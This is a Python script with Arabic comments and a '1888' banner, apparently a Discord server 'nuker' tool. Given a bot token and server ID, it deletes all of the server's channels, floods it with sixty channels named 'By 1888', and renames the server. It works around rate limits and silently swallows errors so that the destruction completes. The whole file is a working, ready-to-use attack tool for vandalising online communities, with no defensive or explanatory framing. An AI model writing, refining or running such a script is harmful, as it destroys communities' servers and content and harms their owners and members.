import httpx
import asyncio
import time
import os

# --- الإعدادات الثابتة ---
NAME = 'By 1888'
AMOUNT = 60

# ألوان الواجهة الاحترافية
RED = "\033[1;31m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

def draw_banner():
    """واجهة احترافية تركز على الرقم 1888"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{CYAN}░░███╗░░░█████╗░░█████╗░░█████╗░
{CYAN}░████║░░██╔══██╗██╔══██╗██╔══██╗
{CYAN}██╔██║░░╚█████╔╝╚█████╔╝╚█████╔╝
{CYAN}╚═╝██║░░██╔══██╗██╔══██╗██╔══██╗
{CYAN}███████╗╚█████╔╝╚█████╔╝╚█████╔╝
{CYAN}╚══════╝░╚════╝░░╚════╝░░╚════╝░
{CYAN}                       >> Created by: 1888 << {RESET}
    """
    print(banner)
    print(f"{WHITE} " + "━" * 78 + f"{RESET}")

async def delete_channel(client, ch_id):
    """حذف القناة مع معالجة حد السرعة تلقائياً"""
    url = f"https://discord.com/api/v9/channels/{ch_id}"
    while True:
        try:
            res = await client.delete(url)
            if res.status_code in [204, 404]: break
            if res.status_code == 429:
                await asyncio.sleep(res.json().get('retry_after', 0.1))
        except: pass

async def create_channel(client, guild_id):
    """إنشاء قناة جديدة بضمان النجاح"""
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    while True:
        try:
            res = await client.post(url, json={"name": NAME, "type": 0})
            if res.status_code == 201: break
            if res.status_code == 429:
                await asyncio.sleep(res.json().get('retry_after', 0.1))
        except: pass

async def rename_server(client, guild_id):
    """تعديل اسم السيرفر فوراً"""
    url = f"https://discord.com/api/v9/guilds/{guild_id}"
    try:
        await client.patch(url, json={"name": NAME})
    except: pass

async def start_storm():
    draw_banner()
    
    # إدخال البيانات المطلوبة
    token = input(f"{CYAN}[?]{WHITE} Enter Bot Token: {RESET}").strip()
    guild_id = input(f"{CYAN}[?]{WHITE} Enter Server ID: {RESET}").strip()
    
    print(f"\n{GREEN}[*] Accessing Discord API Gateway...{RESET}")
    
    headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)

    async with httpx.AsyncClient(headers=headers, http2=True, limits=limits, timeout=None) as client:
        try:
            # التحقق من الصلاحية وجلب القنوات للتدمير
            resp = await client.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels")
            if resp.status_code != 200:
                print(f"{RED}❌ Error: Invalid Credentials!{RESET}")
                return
            channels = resp.json()
        except:
            print(f"{RED}❌ Failed to connect to Discord!{RESET}"); return

        print(f"{RED}[!] PROTOCOL 1888 ACTIVATED...{RESET}")
        
        while True:
            print(f"{WHITE} " + "━" * 78 + f"{RESET}")
            print(f"{CYAN}[1]{WHITE} Delete Channels{RESET}")
            print(f"{CYAN}[2]{WHITE} Create Channels{RESET}")
            print(f"{CYAN}[3]{WHITE} Rename Server{RESET}")
            print(f"{CYAN}[4]{WHITE} Exit{RESET}")
            print(f"{WHITE} " + "━" * 78 + f"{RESET}")
            choice = input(f"{CYAN}[?]{WHITE} Enter your choice: {RESET}").strip()
            
            if choice == "1":
                for ch in channels:
                    await delete_channel(client, ch['id'])
                print(f"{GREEN}[*] Channels deleted successfully!{RESET}")
            elif choice == "2":
                for _ in range(AMOUNT):
                    await create_channel(client, guild_id)
                print(f"{GREEN}[*] Channels created successfully!{RESET}")
            elif choice == "3":
                await rename_server(client, guild_id)
                print(f"{GREEN}[*] Server renamed successfully!{RESET}")
            elif choice == "4":
                break
            else:
                print(f"{RED}❌ Invalid choice!{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(start_storm())
    except KeyboardInterrupt:
        pass